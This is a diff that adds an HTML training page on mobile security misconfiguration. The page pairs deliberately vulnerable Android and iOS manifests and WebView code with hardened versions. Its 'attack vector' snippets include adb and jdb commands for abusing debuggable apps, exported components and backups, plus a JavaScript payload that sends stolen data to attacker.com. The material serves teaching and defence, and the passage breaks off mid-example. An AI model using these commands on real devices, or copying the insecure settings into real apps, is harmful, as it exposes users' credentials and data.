@@ -215,7 +215,1205 @@
         </a>
         
         <div class="content">
-{CONTENT}
+            <h1>M08: Security Misconfiguration - Examples</h1>
+
+<h2>Table of Contents</h2>
+<ul>
+<li><a href="#vulnerable-examples">Vulnerable Examples</a></li>
+<li><a href="#secure-examples">Secure Examples</a></li>
+<li><a href="#configuration-comparisons">Configuration Comparisons</a></li>
+<li><a href="#platform-specific-examples">Platform-Specific Examples</a></li>
+<li><a href="#real-world-scenarios">Real-World Scenarios</a></li>
+</ul>
+
+<h2>Vulnerable Examples</h2>
+
+<h3>❌ Example 1: Debuggable Production App</h3>
+
+<strong>Vulnerable Code (Android - AndroidManifest.xml)</strong>:
+<p>``<code>xml</p>
+<?xml version="1.0" encoding="utf-8"?>
+<manifest xmlns:android="http://schemas.android.com/apk/res/android"
+<p>    package="com.example.vulnerableapp"></p>
+    
+    <!-- VULNERABLE: debuggable=true in production -->
+    <application
+<p>        android:debuggable="true"</p>
+<p>        android:allowBackup="true"</p>
+<p>        android:label="@string/app_name"></p>
+        
+        <activity
+<p>            android:name=".MainActivity"</p>
+<p>            android:exported="true"></p>
+            <intent-filter>
+                <action android:name="android.intent.action.MAIN" />
+                <category android:name="android.intent.category.LAUNCHER" />
+            </intent-filter>
+        </activity>
+    </application>
+</manifest>
+</code>`<code>
+
+<strong>Why It's Vulnerable</strong>:
+<ul>
+<li>Allows runtime debugging with tools like </code>jdb<code></li>
+<li>Enables memory inspection and manipulation</li>
+<li>Allows attachment of debugging tools without rooting</li>
+<li>Exposes internal app state and data</li>
+<li>Can bypass security checks through debugging</li>
+</ul>
+
+<strong>Attack Vector</strong>:
+</code>`<code>bash
+<h1>Attacker can attach debugger to running app</h1>
+<p>adb jdwp  # List debuggable processes</p>
+<p>adb forward tcp:8700 jdwp:<PID></p>
+<p>jdb -attach localhost:8700</p>
+
+<h1>Then execute arbitrary code or inspect memory</h1>
+</code>`<code>
+
+<h3>❌ Example 2: Excessive Permissions</h3>
+
+<strong>Vulnerable Code (Android - AndroidManifest.xml)</strong>:
+</code>`<code>xml
+<?xml version="1.0" encoding="utf-8"?>
+<manifest xmlns:android="http://schemas.android.com/apk/res/android"
+<p>    package="com.example.overprivileged"></p>
+    
+    <!-- VULNERABLE: Requesting unnecessary permissions -->
+    <uses-permission android:name="android.permission.INTERNET" />
+    <uses-permission android:name="android.permission.READ_SMS" />
+    <uses-permission android:name="android.permission.SEND_SMS" />
+    <uses-permission android:name="android.permission.READ_CONTACTS" />
+    <uses-permission android:name="android.permission.WRITE_CONTACTS" />
+    <uses-permission android:name="android.permission.ACCESS_FINE_LOCATION" />
+    <uses-permission android:name="android.permission.ACCESS_COARSE_LOCATION" />
+    <uses-permission android:name="android.permission.CAMERA" />
+    <uses-permission android:name="android.permission.RECORD_AUDIO" />
+    <uses-permission android:name="android.permission.READ_EXTERNAL_STORAGE" />
+    <uses-permission android:name="android.permission.WRITE_EXTERNAL_STORAGE" />
+    <uses-permission android:name="android.permission.CALL_PHONE" />
+    <uses-permission android:name="android.permission.READ_PHONE_STATE" />
+    
+    <application>
+        <!-- Simple calculator app that only needs internet -->
+    </application>
+</manifest>
+</code>`<code>
+
+<strong>Why It's Vulnerable</strong>:
+<ul>
+<li>Violates principle of least privilege</li>
+<li>Increases attack surface</li>
+<li>Privacy concerns for users</li>
+<li>Potential for data exfiltration</li>
+<li>May be rejected by app stores</li>
+<li>Users may refuse installation</li>
+</ul>
+
+<h3>❌ Example 3: Cleartext Traffic Allowed</h3>
+
+<strong>Vulnerable Code (Android - AndroidManifest.xml)</strong>:
+</code>`<code>xml
+<?xml version="1.0" encoding="utf-8"?>
+<manifest xmlns:android="http://schemas.android.com/apk/res/android"
+<p>    package="com.example.insecurenetwork"></p>
+    
+    <!-- VULNERABLE: Allowing cleartext HTTP traffic -->
+    <application
+<p>        android:usesCleartextTraffic="true"</p>
+<p>        android:networkSecurityConfig="@xml/network_security_config"></p>
+    </application>
+</manifest>
+
+<!-- res/xml/network_security_config.xml -->
+<?xml version="1.0" encoding="utf-8"?>
+<network-security-config>
+    <!-- VULNERABLE: Permitting cleartext for all domains -->
+    <base-config cleartextTrafficPermitted="true">
+        <trust-anchors>
+            <certificates src="system" />
+            <certificates src="user" />  <!-- Also dangerous -->
+        </trust-anchors>
+    </base-config>
+</network-security-config>
+</code>`<code>
+
+<strong>Why It's Vulnerable</strong>:
+<ul>
+<li>Allows unencrypted HTTP connections</li>
+<li>Susceptible to man-in-the-middle attacks</li>
+<li>Credentials and data sent in plaintext</li>
+<li>Network traffic can be intercepted</li>
+<li>User-installed certificates trusted (allows SSL interception)</li>
+</ul>
+
+<strong>Attack Vector</strong>:
+</code>`<code>bash
+<h1>Attacker on same network can intercept traffic</h1>
+<p>mitmproxy -p 8080</p>
+<h1>All HTTP traffic visible and modifiable</h1>
+</code>`<code>
+
+<h3>❌ Example 4: Exported Components Without Protection</h3>
+
+<strong>Vulnerable Code (Android - AndroidManifest.xml)</strong>:
+</code>`<code>xml
+<?xml version="1.0" encoding="utf-8"?>
+<manifest xmlns:android="http://schemas.android.com/apk/res/android"
+<p>    package="com.example.exposedcomponents"></p>
+    
+    <application>
+        <!-- VULNERABLE: Exported activity without permissions -->
+        <activity
+<p>            android:name=".AdminActivity"</p>
+<p>            android:exported="true"></p>
+            <intent-filter>
+                <action android:name="com.example.ADMIN_ACTION" />
+                <category android:name="android.intent.category.DEFAULT" />
+            </intent-filter>
+        </activity>
+        
+        <!-- VULNERABLE: Exported content provider -->
+        <provider
+<p>            android:name=".UserDataProvider"</p>
+<p>            android:authorities="com.example.provider.userdata"</p>
+<p>            android:exported="true"</p>
+<p>            android:grantUriPermissions="true" /></p>
+        
+        <!-- VULNERABLE: Exported broadcast receiver -->
+        <receiver
+<p>            android:name=".PaymentReceiver"</p>
+<p>            android:exported="true"></p>
+            <intent-filter>
+                <action android:name="com.example.PAYMENT_COMPLETE" />
+            </intent-filter>
+        </receiver>
+        
+        <!-- VULNERABLE: Exported service -->
+        <service
+<p>            android:name=".DatabaseService"</p>
+<p>            android:exported="true" /></p>
+    </application>
+</manifest>
+</code>`<code>
+
+<strong>Why It's Vulnerable</strong>:
+<ul>
+<li>Any app can invoke exported components</li>
+<li>No authentication or authorization</li>
+<li>Potential for unauthorized data access</li>
+<li>Possible privilege escalation</li>
+<li>Can trigger sensitive operations</li>
+</ul>
+
+<strong>Attack Vector</strong>:
+</code>`<code>bash
+<h1>Attacker app can invoke admin activity</h1>
+<p>adb shell am start -n com.example.exposedcomponents/.AdminActivity</p>
+
+<h1>Access content provider data</h1>
+<p>adb shell content query --uri content://com.example.provider.userdata/users</p>
+
+<h1>Send malicious broadcast</h1>
+<p>adb shell am broadcast -a com.example.PAYMENT_COMPLETE</p>
+</code>`<code>
+
+<h3>❌ Example 5: Backup Including Sensitive Data</h3>
+
+<strong>Vulnerable Code (Android - AndroidManifest.xml)</strong>:
+</code>`<code>xml
+<?xml version="1.0" encoding="utf-8"?>
+<manifest xmlns:android="http://schemas.android.com/apk/res/android"
+<p>    package="com.example.unsecurebackup"></p>
+    
+    <!-- VULNERABLE: Backup enabled without exclusion rules -->
+    <application
+<p>        android:allowBackup="true"></p>
+        <!-- No backup rules defined -->
+    </application>
+</manifest>
+</code>`<code>
+
+<strong>Vulnerable Storage Code</strong>:
+</code>`<code>java
+<p>public class LoginManager {</p>
+<p>    public void saveCredentials(String username, String password) {</p>
+<p>        // VULNERABLE: Stored in shared preferences (included in backups)</p>
+<p>        SharedPreferences prefs = context.getSharedPreferences("user_prefs", MODE_PRIVATE);</p>
+<p>        prefs.edit()</p>
+<p>            .putString("username", username)</p>
+<p>            .putString("password", password)  // Plaintext password in backup!</p>
+<p>            .putString("api_token", apiToken)</p>
+<p>            .apply();</p>
+<p>    }</p>
+<p>}</p>
+</code>`<code>
+
+<strong>Why It's Vulnerable</strong>:
+<ul>
+<li>Sensitive data included in Android backups</li>
+<li>Accessible via </code>adb backup<code></li>
+<li>Restored to different devices</li>
+<li>No encryption for backup data</li>
+<li>Accessible on compromised Google accounts</li>
+</ul>
+
+<strong>Attack Vector</strong>:
+</code>`<code>bash
+<h1>Extract backup with sensitive data</h1>
+<p>adb backup -f backup.ab -noapk com.example.unsecurebackup</p>
+<h1>Convert and extract</h1>
+<p>dd if=backup.ab bs=24 skip=1 | openssl zlib -d > backup.tar</p>
+<p>tar -xvf backup.tar</p>
+<h1>Access shared_prefs/user_prefs.xml with passwords</h1>
+</code>`<code>
+
+<h3>❌ Example 6: Weak WebView Configuration</h3>
+
+<strong>Vulnerable Code (Android - Java)</strong>:
+</code>`<code>java
+<p>public class VulnerableWebViewActivity extends AppCompatActivity {</p>
+<p>    @Override</p>
+<p>    protected void onCreate(Bundle savedInstanceState) {</p>
+<p>        super.onCreate(savedInstanceState);</p>
+        
+<p>        WebView webView = new WebView(this);</p>
+<p>        WebSettings settings = webView.getSettings();</p>
+        
+<p>        // VULNERABLE: Dangerous WebView configuration</p>
+<p>        settings.setJavaScriptEnabled(true);</p>
+<p>        settings.setAllowFileAccess(true);</p>
+<p>        settings.setAllowContentAccess(true);</p>
+<p>        settings.setAllowFileAccessFromFileURLs(true);</p>
+<p>        settings.setAllowUniversalAccessFromFileURLs(true);</p>
+<p>        settings.setDomStorageEnabled(true);</p>
+<p>        settings.setDatabaseEnabled(true);</p>
+        
+<p>        // VULNERABLE: JavaScript interface exposed</p>
+<p>        webView.addJavascriptInterface(new JavaScriptInterface(), "Android");</p>
+        
+<p>        // VULNERABLE: Loading untrusted content</p>
+<p>        String userUrl = getIntent().getStringExtra("url");</p>
+<p>        webView.loadUrl(userUrl);  // No URL validation!</p>
+        
+<p>        // VULNERABLE: Debugging enabled</p>
+<p>        WebView.setWebContentsDebuggingEnabled(true);</p>
+        
+<p>        setContentView(webView);</p>
+<p>    }</p>
+    
+<p>    // VULNERABLE: Exposed interface</p>
+<p>    public class JavaScriptInterface {</p>
+<p>        @JavascriptInterface</p>
+<p>        public String getSensitiveData() {</p>
+<p>            return readSensitiveData();  // Accessible from JavaScript!</p>
+<p>        }</p>
+<p>    }</p>
+<p>}</p>
+</code>`<code>
+
+<strong>Why It's Vulnerable</strong>:
+<ul>
+<li>JavaScript can access local files</li>
+<li>Cross-site scripting (XSS) attacks possible</li>
+<li>Arbitrary file read/write</li>
+<li>JavaScript interface exposes native functions</li>
+<li>No URL validation</li>
+<li>Chrome DevTools can inspect WebView</li>
+</ul>
+
+<strong>Attack Vector</strong>:
+</code>`<code>javascript
+<p>// Malicious website loaded in WebView</p>
+<script>
+<p>  // Access native interface</p>
+<p>  var data = Android.getSensitiveData();</p>
+  
+<p>  // Read local files</p>
+<p>  var xhr = new XMLHttpRequest();</p>
+<p>  xhr.open('GET', 'file:///data/data/com.example.app/shared_prefs/secrets.xml');</p>
+<p>  xhr.send();</p>
+  
+<p>  // Exfiltrate data</p>
+<p>  fetch('https://attacker.com/steal?data=' + data);</p>
+</script>
+</code>`<code>
+
+<h3>❌ Example 7: iOS Insecure App Transport Security</h3>
+
+<strong>Vulnerable Code (iOS - Info.plist)</strong>:
+</code>`<code>xml
+<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" 
+<p>    "http://www.apple.com/DTDs/PropertyList-1.0.dtd"></p>
+<plist version="1.0">
+<dict>
+    <!-- VULNERABLE: Disabling App Transport Security -->
+    <key>NSAppTransportSecurity</key>
+    <dict>
+        <!-- DANGEROUS: Allows all insecure connections -->
+        <key>NSAllowsArbitraryLoads</key>
+        <true/>
+        
+        <!-- DANGEROUS: Also disabled for web views -->
+        <key>NSAllowsArbitraryLoadsInWebContent</key>
+        <true/>
+        
+        <!-- DANGEROUS: Allows local networking without TLS -->
+        <key>NSAllowsLocalNetworking</key>
+        <true/>
+    </dict>
+    
+    <!-- VULNERABLE: Overly permissive permissions -->
+    <key>NSPhotoLibraryUsageDescription</key>
+    <string>We need access</string>
+    <key>NSCameraUsageDescription</key>
+    <string>We need access</string>
+    <key>NSMicrophoneUsageDescription</key>
+    <string>We need access</string>
+    <key>NSLocationWhenInUseUsageDescription</key>
+    <string>We need access</string>
+    <key>NSLocationAlwaysUsageDescription</key>
+    <string>We need access</string>
+    <key>NSContactsUsageDescription</key>
+    <string>We need access</string>
+</dict>
+</plist>
+</code>`<code>
+
+<strong>Why It's Vulnerable</strong>:
+<ul>
+<li>Allows HTTP connections (no encryption)</li>
+<li>Man-in-the-middle attacks possible</li>
+<li>Weak TLS versions accepted</li>
+<li>No certificate validation</li>
+<li>Vague permission descriptions (may be rejected)</li>
+</ul>
+
+<h3>❌ Example 8: Missing ProGuard Configuration</h3>
+
+<strong>Vulnerable Code (Android - build.gradle)</strong>:
+</code>`<code>gradle
+<p>android {</p>
+<p>    buildTypes {</p>
+<p>        release {</p>
+<p>            // VULNERABLE: ProGuard disabled</p>
+<p>            minifyEnabled false</p>
+<p>            shrinkResources false</p>
+            
+<p>            // No obfuscation</p>
+<p>            // debuggable false  // Commented out!</p>
+<p>        }</p>
+<p>    }</p>
+<p>}</p>
+</code>`<code>
+
+<strong>Why It's Vulnerable</strong>:
+<ul>
+<li>Easy to reverse engineer</li>
+<li>Class and method names readable</li>
+<li>String literals visible</li>
+<li>Debug information present</li>
+<li>Larger APK size</li>
+<li>Security through obscurity reduced</li>
+</ul>
+
+<h2>Secure Examples</h2>
+
+<h3>✅ Example 1: Secure Android Manifest</h3>
+
+<strong>Secure Code (Android - AndroidManifest.xml)</strong>:
+</code>`<code>xml
+<?xml version="1.0" encoding="utf-8"?>
+<manifest xmlns:android="http://schemas.android.com/apk/res/android"
+<p>    package="com.example.secureapp"></p>
+    
+    <!-- ✅ GOOD: Request only necessary permissions -->
+    <uses-permission android:name="android.permission.INTERNET" />
+    <uses-permission android:name="android.permission.CAMERA" />
+    
+    <application
+<p>        android:name=".SecureApplication"</p>
+<p>        android:label="@string/app_name"</p>
+<p>        android:icon="@mipmap/ic_launcher"</p>
+        
+        <!-- ✅ GOOD: Security settings -->
+<p>        android:debuggable="false"</p>
+<p>        android:allowBackup="true"</p>
+<p>        android:fullBackupContent="@xml/backup_rules"</p>
+<p>        android:dataExtractionRules="@xml/data_extraction_rules"</p>
+<p>        android:usesCleartextTraffic="false"</p>
+<p>        android:networkSecurityConfig="@xml/network_security_config"</p>
+<p>        android:requestLegacyExternalStorage="false"></p>
+        
+        <!-- ✅ GOOD: Not exported by default -->
+        <activity
+<p>            android:name=".MainActivity"</p>
+<p>            android:exported="true"></p>
+            <intent-filter>
+                <action android:name="android.intent.action.MAIN" />
+                <category android:name="android.intent.category.LAUNCHER" />
+            </intent-filter>
+        </activity>
+        
+        <!-- ✅ GOOD: Internal activity not exported -->
+        <activity
+<p>            android:name=".ProfileActivity"</p>
+<p>            android:exported="false" /></p>
+        
+        <!-- ✅ GOOD: Protected content provider -->
+        <provider
+<p>            android:name=".SecureDataProvider"</p>
+<p>            android:authorities="com.example.secureapp.provider"</p>
+<p>            android:exported="false"</p>
+<p>            android:grantUriPermissions="false" /></p>
+    </application>
+</manifest>
+</code>`<code>
+
+<strong>Secure Backup Configuration (res/xml/backup_rules.xml)</strong>:
+</code>`<code>xml
+<?xml version="1.0" encoding="utf-8"?>
+<full-backup-content>
+    <!-- ✅ GOOD: Include only safe data -->
+    <include domain="sharedpref" path="app_preferences.xml"/>
+    <include domain="file" path="cache/"/>
+    
+    <!-- ✅ GOOD: Exclude sensitive data -->
+    <exclude domain="sharedpref" path="secure_prefs.xml"/>
+    <exclude domain="sharedpref" path="encrypted_prefs.xml"/>
+    <exclude domain="database" path="credentials.db"/>
+    <exclude domain="file" path="keys/"/>
+    <exclude domain="file" path="tokens/"/>
+</full-backup-content>
+</code>`<code>
+
+<strong>Secure Network Configuration (res/xml/network_security_config.xml)</strong>:
+</code>`<code>xml
+<?xml version="1.0" encoding="utf-8"?>
+<network-security-config>
+    <!-- ✅ GOOD: Block cleartext by default -->
+    <base-config cleartextTrafficPermitted="false">
+        <trust-anchors>
+            <!-- Only trust system certificates -->
+            <certificates src="system" />
+        </trust-anchors>
+    </base-config>
+    
+    <!-- ✅ GOOD: Certificate pinning for API -->
+    <domain-config cleartextTrafficPermitted="false">
+        <domain includeSubdomains="true">api.example.com</domain>
+        <pin-set expiration="2025-12-31">
+            <pin digest="SHA-256">primaryCertificateHash==</pin>
+            <pin digest="SHA-256">backupCertificateHash==</pin>
+        </pin-set>
+        <trust-anchors>
+            <certificates src="system" />
+        </trust-anchors>
+    </domain-config>
+    
+    <!-- ✅ GOOD: Debug overrides (only active in debug builds) -->
+    <debug-overrides>
+        <trust-anchors>
+            <certificates src="user" />
+            <certificates src="system" />
+        </trust-anchors>
+    </debug-overrides>
+</network-security-config>
+</code>`<code>
+
+<h3>✅ Example 2: Secure Build Configuration</h3>
+
+<strong>Secure Code (Android - build.gradle)</strong>:
+</code>`<code>gradle
+<p>android {</p>
+<p>    compileSdkVersion 34</p>
+    
+<p>    defaultConfig {</p>
+<p>        applicationId "com.example.secureapp"</p>
+<p>        minSdkVersion 26</p>
+<p>        targetSdkVersion 34</p>
+<p>        versionCode 1</p>
+<p>        versionName "1.0"</p>
+        
+<p>        // ✅ GOOD: Specify supported architectures</p>
+<p>        ndk {</p>
+<p>            abiFilters 'armeabi-v7a', 'arm64-v8a', 'x86', 'x86_64'</p>
+<p>        }</p>
+<p>    }</p>
+    
+<p>    signingConfigs {</p>
+<p>        release {</p>
+<p>            // ✅ GOOD: Use secure signing (keys from environment)</p>
+<p>            // Validate signing configuration before using</p>
+<p>            def keystoreFile = System.getenv("KEYSTORE_FILE")</p>
+<p>            def keystorePass = System.getenv("KEYSTORE_PASSWORD")</p>
+<p>            def keyAlias = System.getenv("KEY_ALIAS")</p>
+<p>            def keyPass = System.getenv("KEY_PASSWORD")</p>
+            
+<p>            if (keystoreFile && keystorePass && keyAlias && keyPass) {</p>
+<p>                storeFile file(keystoreFile)</p>
+<p>                storePassword keystorePass</p>
+<p>                keyAlias keyAlias</p>
+<p>                keyPassword keyPass</p>
+<p>            } else {</p>
+<p>                logger.warn("Release signing configuration not complete. Using debug signing.")</p>
+<p>            }</p>
+<p>        }</p>
+<p>    }</p>
+    
+<p>    buildTypes {</p>
+<p>        debug {</p>
+<p>            debuggable true</p>
+<p>            minifyEnabled false</p>
+<p>            applicationIdSuffix '.debug'</p>
+<p>            versionNameSuffix '-DEBUG'</p>
+<p>        }</p>
+        
+<p>        release {</p>
+<p>            // ✅ GOOD: Production hardening</p>
+<p>            debuggable false</p>
+<p>            minifyEnabled true</p>
+<p>            shrinkResources true</p>
+            
+<p>            proguardFiles getDefaultProguardFile('proguard-android-optimize.txt'),</p>
+<p>                         'proguard-rules.pro'</p>
+            
+<p>            signingConfig signingConfigs.release</p>
+            
+<p>            // ✅ GOOD: Enable additional optimizations</p>
+<p>            crunchPngs true</p>
+            
+<p>            // ✅ GOOD: Remove unused resources</p>
+<p>            resValue "string", "build_type", "release"</p>
+<p>        }</p>
+<p>    }</p>
+    
+<p>    // ✅ GOOD: Disable development features in release</p>
+<p>    buildFeatures {</p>
+<p>        viewBinding true</p>
+<p>        buildConfig true</p>
+<p>    }</p>
+    
+<p>    packagingOptions {</p>
+<p>        // ✅ GOOD: Exclude unnecessary files</p>
+<p>        exclude 'META-INF/DEPENDENCIES'</p>
+<p>        exclude 'META-INF/LICENSE'</p>
+<p>        exclude 'META-INF/LICENSE.txt'</p>
+<p>        exclude 'META-INF/NOTICE'</p>
+<p>        exclude 'META-INF/NOTICE.txt'</p>
+<p>    }</p>
+<p>}</p>
+
+<p>dependencies {</p>
+<p>    // ✅ GOOD: Use latest security libraries</p>
+<p>    implementation 'androidx.security:security-crypto:1.1.0-alpha06'</p>
+    
+<p>    // ✅ GOOD: Debug tools only in debug builds</p>
+<p>    debugImplementation 'com.squareup.leakcanary:leakcanary-android:2.12'</p>
+<p>    debugImplementation 'com.facebook.stetho:stetho:1.6.0'</p>
+<p>}</p>
+</code>`<code>
+
+<strong>Secure ProGuard Rules (proguard-rules.pro)</strong>:
+</code>`<code>proguard
+<h1>✅ GOOD: Comprehensive ProGuard configuration</h1>
+
+<h1>Optimization passes</h1>
+<p>-optimizationpasses 5</p>
+<p>-dontusemixedcaseclassnames</p>
+<p>-dontskipnonpubliclibraryclasses</p>
+<p>-verbose</p>
+
+<h1>Preserve stack traces for crash reporting</h1>
+<p>-keepattributes SourceFile,LineNumberTable</p>
+<p>-renamesourcefileattribute SourceFile</p>
+
+<h1>Remove all logging</h1>
+<p>-assumenosideeffects class android.util.Log {</p>
+<p>    public static <em>*</em> d(...);</p>
+<p>    public static <em>*</em> v(...);</p>
+<p>    public static <em>*</em> i(...);</p>
+<p>    public static <em>*</em> w(...);</p>
+<p>    public static <em>*</em> e(...);</p>
+<p>    public static <em>*</em> wtf(...);</p>
+<p>}</p>
+
+<h1>Remove debug classes completely</h1>
+<p>-assumenosideeffects class com.example.app.debug.** {</p>
+<p>    *;</p>
+<p>}</p>
+
+<h1>Obfuscate but keep crash reporting functional</h1>
+<p>-keepattributes <em>Annotation</em></p>
+<p>-keepattributes Signature</p>
+<p>-keepattributes Exception</p>
+
+<h1>Keep models for serialization</h1>
+<p>-keep class com.example.app.models.<em>* { </em>; }</p>
+<p>-keepclassmembers class com.example.app.models.<em>* { </em>; }</p>
+
+<h1>Aggressive string encryption</h1>
+<p>-adaptclassstrings</p>
+<p>-adaptresourcefilenames</p>
+<p>-adaptresourcefilecontents</p>
+
+<h1>Remove unused code</h1>
+<p>-dontwarn **</p>
+<p>-ignorewarnings</p>
+</code>`<code>
+
+<h3>✅ Example 3: Secure iOS Configuration</h3>
+
+<strong>Secure Code (iOS - Info.plist)</strong>:
+</code>`<code>xml
+<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" 
+<p>    "http://www.apple.com/DTDs/PropertyList-1.0.dtd"></p>
+<plist version="1.0">
+<dict>
+    <!-- ✅ GOOD: Strict App Transport Security -->
+    <key>NSAppTransportSecurity</key>
+    <dict>
+        <!-- Deny arbitrary loads -->
+        <key>NSAllowsArbitraryLoads</key>
+        <false/>
+        
+        <!-- Exception for specific trusted domain -->
+        <key>NSExceptionDomains</key>
+        <dict>
+            <key>api.example.com</key>
+            <dict>
+                <key>NSExceptionRequiresForwardSecrecy</key>
+                <true/>
+                <key>NSExceptionMinimumTLSVersion</key>
+                <string>TLSv1.3</string>
+                <key>NSIncludesSubdomains</key>
+                <true/>
+                <key>NSRequiresCertificateTransparency</key>
+                <true/>
+            </dict>
+        </dict>
+    </dict>
+    
+    <!-- ✅ GOOD: Specific permission descriptions -->
+    <key>NSCameraUsageDescription</key>
+    <string>This app requires camera access to scan QR codes for secure authentication</string>
+    
+    <key>NSPhotoLibraryUsageDescription</key>
+    <string>This app needs access to your photo library to allow you to select profile pictures</string>
+    
+    <!-- ✅ GOOD: Data protection -->
+    <key>NSFileProtectionComplete</key>
+    <true/>
+    
+    <!-- ✅ GOOD: Prevent backup of sensitive data -->
+    <key>UIFileSharingEnabled</key>
+    <false/>
+    
+    <key>LSSupportsOpeningDocumentsInPlace</key>
+    <false/>
+    
+    <!-- ✅ GOOD: Disable features not needed -->
+    <key>UIApplicationExitsOnSuspend</key>
+    <false/>
+</dict>
+</plist>
+</code>`<code>
+
+<strong>Secure iOS Build Settings (Build Configuration)</strong>:
+</code>`<code>swift
+<p>// ✅ GOOD: Conditional compilation for debug features</p>
+<p>#if DEBUG</p>
+<p>import os.log</p>
+
+<p>class Logger {</p>
+<p>    static let enabled = true</p>
+<p>    static func log(_ message: String) {</p>
+<p>        os_log("%{public}@", log: .default, type: .debug, message)</p>
+<p>    }</p>
+<p>}</p>
+<p>#else</p>
+<p>class Logger {</p>
+<p>    static let enabled = false</p>
+<p>    static func log(_ message: String) {</p>
+<p>        // No logging in production</p>
+<p>    }</p>
+<p>}</p>
+<p>#endif</p>
+
+<p>// ✅ GOOD: Anti-debugging protection</p>
+<p>class SecurityManager {</p>
+<p>    static func checkDebugger() {</p>
+<p>        #if !DEBUG</p>
+<p>        var info = kinfo_proc()</p>
+<p>        var size = MemoryLayout<kinfo_proc>.stride</p>
+<p>        var mib: [Int32] = [CTL_KERN, KERN_PROC, KERN_PROC_PID, getpid()]</p>
+        
+<p>        let result = sysctl(&mib, UInt32(mib.count), &info, &size, nil, 0)</p>
+        
+<p>        if result == 0 && (info.kp_proc.p_flag & P_TRACED) != 0 {</p>
+<p>            // Debugger detected in production - exit</p>
+<p>            exit(0)</p>
+<p>        }</p>
+<p>        #endif</p>
+<p>    }</p>
+<p>}</p>
+</code>`<code>
+
+<h3>✅ Example 4: Secure WebView Configuration</h3>
+
+<strong>Secure Code (Android - Java)</strong>:
+</code>`<code>java
+<p>public class SecureWebViewActivity extends AppCompatActivity {</p>
+<p>    private static final List<String> ALLOWED_DOMAINS = Arrays.asList(</p>
+<p>        "https://www.example.com",</p>
+<p>        "https://trusted.example.com"</p>
+<p>    );</p>
+    
+<p>    @Override</p>
+<p>    protected void onCreate(Bundle savedInstanceState) {</p>
+<p>        super.onCreate(savedInstanceState);</p>
+        
+<p>        WebView webView = new WebView(this);</p>
+<p>        WebSettings settings = webView.getSettings();</p>
+        
+<p>        // ✅ GOOD: Minimal permissions</p>
+<p>        settings.setJavaScriptEnabled(true);  // Only if necessary</p>
+<p>        settings.setAllowFileAccess(false);</p>
+<p>        settings.setAllowContentAccess(false);</p>
+<p>        settings.setAllowFileAccessFromFileURLs(false);</p>
+<p>        settings.setAllowUniversalAccessFromFileURLs(false);</p>
+        
+<p>        // ✅ GOOD: Disable storage</p>
+<p>        settings.setDomStorageEnabled(false);</p>
+<p>        settings.setDatabaseEnabled(false);</p>
+<p>        settings.setSavePassword(false);</p>
+<p>        settings.setSaveFormData(false);</p>
+        
+<p>        // ✅ GOOD: Security features</p>
+<p>        settings.setMixedContentMode(WebSettings.MIXED_CONTENT_NEVER_ALLOW);</p>
+        
+<p>        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {</p>
+<p>            settings.setSafeBrowsingEnabled(true);</p>
+<p>        }</p>
+        
+<p>        // ✅ GOOD: Disable debugging in production</p>
+<p>        if (!BuildConfig.DEBUG) {</p>
+<p>            WebView.setWebContentsDebuggingEnabled(false);</p>
+<p>        }</p>
+        
+<p>        // ✅ GOOD: Set secure WebViewClient</p>
+<p>        webView.setWebViewClient(new SecureWebViewClient());</p>
+        
+<p>        // ✅ GOOD: Validate URL before loading</p>
+<p>        String url = getIntent().getStringExtra("url");</p>
+<p>        if (isUrlAllowed(url)) {</p>
+<p>            webView.loadUrl(url);</p>
+<p>        } else {</p>
+<p>            showError("Invalid URL");</p>
+<p>            finish();</p>
+<p>        }</p>
+        
+<p>        setContentView(webView);</p>
+<p>    }</p>
+    
+<p>    // ✅ GOOD: URL validation</p>
+<p>    private boolean isUrlAllowed(String url) {</p>
+<p>        if (url == null || url.isEmpty()) {</p>
+<p>            return false;</p>
+<p>        }</p>
+        
+<p>        try {</p>
+<p>            URL urlObj = new URL(url);</p>
+<p>            String protocol = urlObj.getProtocol();</p>
+            
+<p>            // Only allow HTTPS</p>
+<p>            if (!"https".equals(protocol)) {</p>
+<p>                return false;</p>
+<p>            }</p>
+            
+<p>            // Check against whitelist</p>
+<p>            for (String allowed : ALLOWED_DOMAINS) {</p>
+<p>                if (url.startsWith(allowed)) {</p>
+<p>                    return true;</p>
+<p>                }</p>
+<p>            }</p>
+<p>        } catch (MalformedURLException e) {</p>
+<p>            return false;</p>
+<p>        }</p>
+        
+<p>        return false;</p>
+<p>    }</p>
+    
+<p>    // ✅ GOOD: Secure WebViewClient</p>
+<p>    private class SecureWebViewClient extends WebViewClient {</p>
+<p>        @Override</p>
+<p>        public boolean shouldOverrideUrlLoading(WebView view, WebResourceRequest request) {</p>
+<p>            String url = request.getUrl().toString();</p>
+            
+<p>            if (isUrlAllowed(url)) {</p>
+<p>                return false;  // Allow loading</p>
+<p>            }</p>
+            
+<p>            // Block unauthorized URLs</p>
+<p>            return true;</p>
+<p>        }</p>
+        
+<p>        @Override</p>
+<p>        public void onReceivedSslError(WebView view, SslErrorHandler handler, SslError error) {</p>
+<p>            // ✅ GOOD: Don't ignore SSL errors</p>
+<p>            handler.cancel();</p>
+<p>            showError("SSL Error: Connection not secure");</p>
+<p>        }</p>
+<p>    }</p>
+<p>}</p>
+</code>`<code>
+
+<strong>Secure Code (iOS - Swift)</strong>:
+</code>`<code>swift
+<p>import WebKit</p>
+
+<p>class SecureWebViewController: UIViewController, WKNavigationDelegate {</p>
+<p>    private let allowedDomains = ["https://www.example.com", "https://trusted.example.com"]</p>
+<p>    private var webView: WKWebView!</p>
+    
+<p>    override func viewDidLoad() {</p>
+<p>        super.viewDidLoad()</p>
+        
+<p>        // ✅ GOOD: Secure WebView configuration</p>
+<p>        let config = WKWebViewConfiguration()</p>
+<p>        let prefs = WKWebpagePreferences()</p>
+        
+<p>        // Disable JavaScript if not needed</p>
+<p>        prefs.allowsContentJavaScript = true  // Only if required</p>
+<p>        config.defaultWebpagePreferences = prefs</p>
+        
+<p>        // ✅ GOOD: Disable inline media</p>
+<p>        config.allowsInlineMediaPlayback = false</p>
+<p>        config.mediaTypesRequiringUserActionForPlayback = .all</p>
+        
+<p>        // ✅ GOOD: Minimize data detectors</p>
+<p>        config.dataDetectorTypes = []</p>
+        
+<p>        // ✅ GOOD: Disable AirPlay</p>
+<p>        config.allowsAirPlayForMediaPlayback = false</p>
+        
+<p>        webView = WKWebView(frame: .zero, configuration: config)</p>
+<p>        webView.navigationDelegate = self</p>
+        
